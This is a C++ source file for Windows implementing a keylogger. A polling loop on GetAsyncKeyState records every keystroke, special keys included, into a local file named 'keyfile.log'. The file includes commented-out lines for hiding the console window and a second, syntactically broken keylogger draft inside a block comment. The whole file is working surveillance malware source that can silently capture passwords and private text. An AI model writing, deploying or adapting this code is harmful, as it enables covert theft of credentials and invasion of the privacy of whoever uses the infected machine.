//#define _WIN32_WINNT 0x0500
#include <Windows.h>//FOR SLEEP SPECIAL KEYS AND GETASYNKEYSTATE
#include <string>
#include <stdlib.h>
#include <stdio.h>
//#include <iostream> // FOR COUT CIN
#include <fstream> //FOR WRITE IN A FILE

using namespace std;

void writeSpecialLog(string keyInput)
{
    ofstream keyloggerSaveFile;
    keyloggerSaveFile.open("keyfile.log", ofstream::app);

    if (keyloggerSaveFile.is_open())
    {
        keyloggerSaveFile << keyInput;
        keyloggerSaveFile.close();
    }//NO NEED A ELSE STATMENT BECAUSE THE FILE  WILL BE CREATE IN ANY CASE
}


bool specialKeys(int sKey)
{
    switch (sKey)

    {
    //https://msdn.microsoft.com/en-us/library/ms927178.aspx


    case VK_SPACE:
        //cout << " " << endl;
        writeSpecialLog(" ");
        return true;
        break;

    case VK_RETURN:
        //cout << "\n" << endl;
        writeSpecialLog("\n");
        return true;
        break;

    case VK_SHIFT:
        //cout << "SHIFT" << endl;
        writeSpecialLog("#<SHIFT>#");
        return true;
        break;

    case VK_TAB:
        //cout << "TAB" << endl;
        writeSpecialLog("#<TAB>#");
        return true;
        break;

    case VK_DELETE:
        //cout << "TAB" << endl;
        writeSpecialLog("#<Del>#");
        return true;
        break;

    case VK_BACK:
        //cout << "TAB" << endl;
        //NO NEED TO MAKE \t LUL
        writeSpecialLog("#<BACKSPACE>#");
        return true;
        break;

    default:
        return false;
    }
}



int main()
{
    //FreeConsole();
    //ShowWindow(GetConsoleWindow(), SW_HIDE);//Hide windows

    while (true)
    {
        Sleep(10);//INFINITE SLEEP FOR ACTIVE WINDOWS
        for (int key = 8; key <= 222; key++)
            //WE START AT BACKSPACE WHO IS 8 IN THE ASCII CODE
        {
            if (GetAsyncKeyState(key) == -32767)//IF A TOUCH IS PRESS
            {
                //IF WE DONT HAVE A SPECIFIC KEYS WE PRINT THE AUTHER KEY
                if (specialKeys(key) == false)
                {
                    ofstream keyloggerSaveFile;
                    keyloggerSaveFile.open("keyfile.log", ofstream::app);

                    if (keyloggerSaveFile.is_open())
                    {
                        if((key>64)&&(key<91)&&!(GetAsyncKeyState(0x10)))
                            //GetAsyncKeyState(0x10) MEAN IF THE LOCK KEY IS DOWN
                        {
                            key+=32;
                            keyloggerSaveFile << char(key);//CHAR(27) FOR EXEMPLE IS ESCAPE
                            //cout << char(key) << endl;
                            keyloggerSaveFile.close();
                        }
                        else{
                            keyloggerSaveFile << char(key);
                            keyloggerSaveFile.close();

                        }


                    }
                }
            }
        }
    }

    return 0;
}
/*#include <iostream>
#include <windows.h>

using namespace std;

int Save(char _key, char *file);

int main()
{
    char i;

    while (true)
    {
        for (i = 8; i <= 255; i++)
        {
            if (GetAsyncKeyState(i) == -32,767)//si on appuie sure rien
                Save(i, "log.txt");
        }
    }

    return 0;
}

int Save(char _key, char *file)
{
    cout << _key << endl;

    FILE *OUTPUT_FILE;

    OUTPUT_FILE = fopen(file, "a+");

    switch()
    case
    fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);

    return 0 ;
}*/
